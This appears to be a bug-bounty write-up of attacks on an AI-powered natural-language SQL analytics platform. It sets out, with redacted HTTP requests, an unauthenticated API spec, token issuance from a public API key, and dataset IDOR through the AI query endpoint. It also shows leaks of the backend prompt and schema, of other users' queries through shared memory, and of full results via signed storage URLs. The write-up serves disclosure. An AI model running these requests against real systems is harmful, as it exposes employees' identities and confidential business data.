# SQLi Without SQLi

- **Source URL:** https://medium.com/@Tyrion404/sqli-without-sqli-i-asked-the-ai-it-queried-the-database-1f02a4166619
- **Fetched from:** https://medium.com/@Tyrion404/sqli-without-sqli-i-asked-the-ai-it-queried-the-database-1f02a4166619?source=rss-b769089fe860------2
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:**  (id 14893)
- **Method:** medium-rss-feed (full content:encoded) readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
- **Author/Published (RSS):** Tyrion404 / Tue, 01 Sep 2026 20:58:58 GMT

*A Tyrion404 writeup — on the art of asking the right question to the wrong endpoint.*

A Lannister always pays his debts. But this system was paying debts it owed to people who never asked.

I didn’t need to be clever. I just needed to ask the AI nicely.

The target was an AI-powered analytics platform — a natural-language query interface layered on top of a procurement and contract database. Think of it as a chatbot that translates employee questions into SQL, executes them against live financial data, and streams back structured results.

The architecture is worth understanding before anything else:

The entitlement check was on the wrong endpoint.

Before logging in or obtaining any token, I sent a GET request to /python-api/openapi.json.

GET /python-api/openapi.json HTTP/1.1

Host: \[REDACTED\]

The response was a full OpenAPI 3.1.0 specification for the entire Python API surface — every endpoint, every parameter, every expected header — served without any authentication requirement.

```
{
  "openapi": "3.1.0",
  "info": {"title": "Spend Alice API", "version": "0.1.0"},
  "paths": {
    "/userBasedssoAuthentication": {"post": {...}},
    "/getAliceRequestAccess": {"post": {...}},
    "/getAliceAccessibleDatatsets": {"post": {...}},
    "/getAliceStoreMsgV2Base64": {"post": {...}},
    "/getAliceChatLogsV2": {"post": {...}},
    "/getAliceWithinChatFeedback": {"post": {...}},
    "/streamAliceCDOResponse": {"post": {...}},
    "/generateCDOToken": {"get": {...}},
    "/": {"get": {...}}
  }
}
```
The interactive documentation at /python-api/docs and /python-api/redoc were also reachable without authentication. The platform had documented its own attack surface and made it public.

Endpoint Auth Required POST /userBasedssoAuthentication x-api-key only POST /getAliceRequestAccess x-api-key + token POST /getAliceAccessibleDatatsets x-api-key + token POST /getAliceStoreMsgV2Base64 x-api-key + token POST /getAliceChatLogsV2 x-api-key + token POST /getAliceWithinChatFeedback x-api-key + token POST /streamAliceCDOResponse x-api-key + token GET /generateCDOToken None GET /python-api/docs None GET /python-api/openapi.json None

The x-api-key, as established from the earlier report on this same platform, was available from the public config.js file. No login required.

The Python API had its own authentication endpoint — separate from the main platform’s SSO bypass — that issued JWTs for the AI layer specifically. It accepted a user ID and a username, validated only the x-api-key header, and returned a bearer token.

POST /python-api/userBasedssoAuthentication HTTP/2

Host: \[REDACTED\]

Content-Type: application/json

X-Api-Key: \[REDACTED\]

`{"userId":"****","attuid":"REDACTED"}`
Response:

```
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "token_type": "Bearer",
  "expire_in": 3600
}
```
REDACTED-user was a low-privilege account. No administrative role, no elevated entitlements. I used it deliberately to establish a baseline — the lowest-access identity I could obtain a token for.

Before doing anything else, I confirmed exactly what datasets REDACTED-user was authorized for by calling the entitlement endpoint:

POST /python-api/getAliceAccessibleDatatsets HTTP/1.1

Host: \[REDACTED\]

Content-Type: application/json

x-api-key: \[REDACTED\]

token: \<REDACTED-user token>

{"userId":"\*\*\*\*\*"}

```
{
  "statusCode": 200,
  "statusMessage": "Success",
  "data": [
    {"DATASET_ID": 20**, "CDO_DATASET_ID": "c8c0bb76-...", "DATASET_NAME": "Invoice Spend"},
    {"DATASET_ID": 20**, "CDO_DATASET_ID": "885361c2-...", "DATASET_NAME": "Supply Chain Contracts"},
    {"DATASET_ID": 20**, "CDO_DATASET_ID": "70ad6fc9-...", "DATASET_NAME": "Invoice Spend - Old"}
  ]
}
```
Three datasets. That was the authorized list. Everything else was out of scope for REDACTED-user by the platform's own access control model.

I kept a note of what was *not* on that list. Then I went to ask the AI for exactly those things.

The core finding is architectural: the streamAliceCDOResponse endpoint validates that the JWT belongs to a real user, then passes the askdata\_dataset\_id from the request body directly to the AI tool chain. It never checks whether the authenticated user is authorized for that dataset.

The entitlement check exists — it lives in getAliceAccessibleDatatsets. It just isn't called by the endpoint that actually executes the queries.

**Finding 1 — Contracts dataset (not in REDACTED-user authorized list):**

POST /python-api/streamAliceCDOResponse HTTP/1.1

Host: \[REDACTED\]

Content-Type: application/json

x-api-key: \[REDACTED\]

token: \<REDACTED-user token>

{

"question": "Show all supplier contract values",

"askdata\_dataset\_id": "a803b763-bebb-\*\*\*\*\*\*\*\*",

"model\_name": "gpt-5.4",

"reasoning\_effort": "low",

"tool\_sets": \["analysis-tools"\],

"visualization\_flag": 0,

"web\_search\_flag": 0

}

The AI received the request, called its internal tool to retrieve the SQL generation rules for the requested dataset, generated a SQL query, and executed it against the live database. The full NDJSON event stream:

`{"event":"metadata","chat_id":"91fef2b9-88eb-*****","memories":[]}`
200 rows of live contract data. Top results:

Dataset ID a80\*\*\*\*\* does not appear in REDACTED-user's authorized list. The AI executed the query anyway.

**Finding 1b — IDOR via askdata\_space\_id (separate parameter, same gap):**

The endpoint accepted two different ways to identify a dataset — askdata\_dataset\_id and askdata\_space\_id. The authorization check was absent from both paths.

POST /python-api/streamAliceCDOResponse HTTP/1.1

Host: \[REDACTED\]

Content-Type: application/json

x-api-key: \[REDACTED\]

token: \<REDACTED-user token>

{

"question": "What is the total spend by top 5 suppliers in 2024?",

"askdata\_space\_id": "1d5a251a-b8a8-\*\*\*\*\*\*",

"cdo\_space\_id\_flag": "Y",

"model\_name": "gpt-5.4",

"reasoning\_effort": "low",

"tool\_sets": \["analysis-tools"\],

"visualization\_flag": 0,

"web\_search\_flag": 0

}

Returned 2024 supplier invoice spend

**Finding 1c — IDOR on a second restricted Contracts space:**

POST /python-api/streamAliceCDOResponse HTTP/1.1

Host: \[REDACTED\]

Content-Type: application/json

x-api-key: \[REDACTED\]

token: \<REDACTED-user token>

"question": "Show top 20 contracts with supplier names and values",

"askdata\_space\_id": "f9267add-acc9-\*\*\*\*\*\*",

"cdo\_space\_id\_flag": "Y",

"model\_name": "gpt-5.4",

"reasoning\_effort": "low",

"tool\_sets": \["analysis-tools"\],

"visualization\_flag": 0,

"web\_search\_flag": 0

}

The AI selected a different internal table — a masked variant of the same contracts dataset — and returned the same top contracts.Two different dataset identifiers, same unauthorized access, same data.

Each query response included a tool\_response event that returned the backend's internal prompt verbatim — the SQL generation rules, column constraints, filtering logic, and the full database schema — visible to the client in the NDJSON stream.

```
{
  "event": "tool_response",
  "message": {
    "content": {
      "result": "Never use quotes around column names or table names. Only use quotes to create column name aliases. Always round metric values to 2 decimal places. Always order by descending for the metric used in the result unless date columns are present. Always use ILIKE '%example%' for filter conditions. Always order by ascending for STATUS_CODE, and then by descending for TOTAL_CONTRACT_VALUE. Always select all columns used in the filter or WHERE clause."
    }
  }
}
```
The full column schemas exposed verbatim in the same event stream:

An attacker who reads the event stream knows every queryable column before they ask their second question. The schema disclosure materially reduces the effort required to extract anything specific.

The AI used a similar\_questions / memories mechanism to improve response relevance — surfacing prior queries from the same dataset as context for the current one. The problem: the memory store was not scoped per user. It was shared.

REDACTED-user's query response, against the Contracts dataset, returned another user's prior question in the memories field:

```
{
  "question": "Show me my active contracts. My name is ***, ATTUID ****, and I work in Transformation & Supply Chain",
  "sql_query": "SELECT contract_number, major_version, status_code, contract_owner, associate_director_name, owner_director, party_name, client_name FROM [REDACTED_TABLE] WHERE status_code='Active' AND contract_owner ILIKE '%***%' ...",
  "search_score": *****
}
```
From the Invoice Spend and Masked Contracts spaces, additional cross-user query history was surfaced:

\[

{

"question": "What are our top BUs according to spend in 2023",

"sql\_query": "SELECT ORGANIZATION\_NAME, RCC\_BUSINESS\_UNIT\_NAME, SUM(INVOICE\_DIST\_AMOUNT) FROM \[REDACTED\_TABLE\] WHERE INVOICE\_ACCOUNTING\_YEAR=2023..."

},

{

"question": "How much have we spent on \*\*\*\*",

"sql\_query": "SELECT SUPPLIER\_NAME\_UVID, SUPPLIER\_NAME\_SVID, SUM(INVOICE\_DIST\_AMOUNT) FROM \[REDACTED\_TABLE\] WHERE SUPPLIER\_NAME\_UVID ILIKE '%\*\*\*%'"

},

{

"question": "What Active contracts are under \*\*\*\*?"

}

\]

REDACTED-User received, without requesting it: a full name (\*\*\*), a corporate username (\*\*\*), a department (Transformation & Supply Chain), and a second username (\*\*\*\*) — belonging to users who had never interacted with REDACTED-USer and whose data should have been isolated.

Every query response — regardless of how many rows the in-chat preview truncated to — included a signed Azure Blob Storage download URL for the complete result set as a CSV file.

"query\_result\_sas\_url": "https://\[REDACTED\_STORAGE\].blob.core.windows.net/\[REDACTED\_CONTAINER\]/sql\_execution\_results/v3/2026\*\*\*.csv?se=2026-\*\*\*\*\*&sp=r&sv=2025-07-05&sr=b&sig=\[REDACTED\_SIG\]"

Field Value Storage provider Azure Blob Storage Permission sp=r (Read) Token expiry \~1 hour from response time

The in-chat preview was capped at 25 rows. The SAS URL pointed to the full result — all 277 rows, all 200 contracts, every invoice record — for anyone who received the response. This was the actual exfiltration path for any query that produced more data than the UI displayed.

The contracts dataset schema — leaked in the tool\_response events — exposed dedicated columns for employee identity: CONTRACT\_OWNER, CONTRACT\_OWNER\_ATTUID, OWNER\_SVP, OWNER\_VP, OWNER\_AVP, OWNER\_DIRECTOR, ASSOCIATE\_DIRECTOR\_NAME. Each of these was directly queryable.

I asked the AI a GROUP BY question:

POST /python-api/streamAliceCDOResponse HTTP/1.1

Host: \[REDACTED\]

Content-Type: application/json

x-api-key: \[REDACTED\]

token: \<REDACTED-User token>

{

"question": "List all unique contract owners with their names and ATTUIDs sorted by number of contracts they own descending. Show CONTRACT OWNER name, ATTUID, and count of contracts.",

"askdata\_dataset\_id": "a803b763-bebb-\*\*\*\*",

"cdo\_user\_id": "\*\*\*\*",

"model\_name": "gpt-5.4",

"stream": true

}

The AI generated and executed:

The AI’s own response: *“I found 277 unique contract owners. The in-chat preview is limited to the top 25 rows.”*

The same query pattern, applied to the SVP and VP ownership columns, returned complete result sets — every name and corporate username for each level:

**Sourcing SVPs (11 unique — full set returned)**

**Sourcing VPs (11 unique — full set returned)**

**Sourcing AVPs / Directors (25 rows returned in preview — full count not confirmed in this test):**

The full 277-row CSV was available via the SAS URL from Finding 5.

Applying the same approach to the invoice dataset:

POST /python-api/streamAliceCDOResponse HTTP/1.1

Host: \[REDACTED\]

Content-Type: application/json

x-api-key: \[REDACTED\]

token: \<REDACTED-user token>

{

"question": "Show me the top 10 individual invoices by amount with invoice number, supplier name, invoice amount, invoice date, business unit, PO number, and any employee or submitter fields available",

"askdata\_dataset\_id": "c8c0bb76-d6be\*\*\*\*",

"cdo\_user\_id": "\*\*\*\*",

"model\_name": "gpt-5.4",

"stream": true

}

Returned data — each row includes the invoice approver’s full name and corporate username:

**Note on the first row:** The name and corporate username in the INVOICE\_APPROVER field matched a publicly known executive identity. This report only confirms that the endpoint returned that name and username tied to a $$$M invoice. I did not attempt to verify or cross-reference the identity externally. If the program can confirm internally, it raises the impact of this finding significantly; absent that confirmation, it is reported as an observed data point.

Also confirmed: a $$,$$M invoice paid to a major telecommunications competitor — competitively sensitive wholesale-access spend — returned in full to a zero-privilege account, including the internal business unit name.

And I have been rewarded with $$$$

*“I have a gift for you — the truth. The truth about the world, and all the things that dwell in it.”*
